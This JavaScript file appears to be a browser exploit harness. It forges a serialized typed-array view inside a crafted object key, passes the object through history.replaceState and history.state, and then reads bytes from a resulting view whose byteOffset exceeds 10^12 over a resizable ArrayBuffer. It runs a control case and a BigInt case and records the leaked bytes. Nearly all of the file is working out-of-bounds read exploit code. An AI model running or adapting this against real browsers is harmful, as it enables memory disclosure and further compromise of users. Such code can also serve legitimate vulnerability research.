// Forge a bounded view one measured 64 KiB stride before the selected RAB.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02];
  var offset = [0, 0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
  var length = [0, 0, 1, 0, 0, 0, 0, 0];
  for (var i = 0; i < offset.length; i++) bytes.push(offset[i]);
  for (var j = 0; j < length.length; j++) bytes.push(length[j]);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
function runCase(id, useBigInt) {
  var phase = "build";
  var result;
  try {
    var backing = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(backing).fill(0x41);
    var filler = new Array(253);
    filler[0] = useBigInt ? BigInt(1) << BigInt(40) : 0;
    filler[1] = backing;
    for (var i = 2; i < 26; i++) {
      var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
      new Uint8Array(neighbor).fill(0x40 + i);
      filler[i] = neighbor;
    }
    for (var j = 26; j < filler.length; j++) filler[j] = {};
    var shared = { marker: 0x51515151 };
    var key = makeKey();
    var input = { filler: filler, first: shared, second: shared };
    input[key] = 0;
    if (useBigInt) mark("negative_ready");
    phase = "store";
    history.replaceState(input, "");
    if (useBigInt) mark("negative_stored");
    phase = "load";
    var output = history.state;
    if (useBigInt) mark("negative_loaded");
    var target = output.filler[1];
    var synthetic = output["\u0000"];
    var viewValid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
      synthetic.byteOffset > 1e12 && synthetic.length === 65536;
    var first = [];
    var last = [];
    if (useBigInt && viewValid) {
      phase = "read_start";
      mark("negative_before_start");
      for (var n = 0; n < 8; n++) first.push(synthetic[n]);
      mark("negative_after_start");
      phase = "read_end";
      for (var t = 65528; t < 65536; t++) last.push(synthetic[t]);
      mark("negative_after_end");
    }
    var expected = useBigInt ? viewValid && first.length === 8 && last.length === 8 :
      output.first === output.second && Object.prototype.hasOwnProperty.call(output, key) && output[key] === 0;
    result = { id: id, status: expected ? "pass" : "fail", details: {
      view_valid: viewValid,
      reported_offset: synthetic instanceof Uint8Array ? synthetic.byteOffset : null,
      reported_length: synthetic instanceof Uint8Array ? synthetic.length : null,
      first: first.join(","), last: last.join(","),
      target_first: new Uint8Array(target)[0],
      target_last: new Uint8Array(target)[7]
    } };
  } catch (error) {
    result = { id: id, status: "error", details: { phase: phase, error: String(error).slice(0, 200) } };
  }
  try { history.replaceState(null, ""); }
  catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
  return result;
}
var control = runCase("negative_no_bigint_control", false);
if (control.status !== "pass")
  return [control, { id: "negative_bigint_case", status: "unsupported", details: { reason: "control_failed" } }];
return [control, runCase("negative_bigint_case", true)];
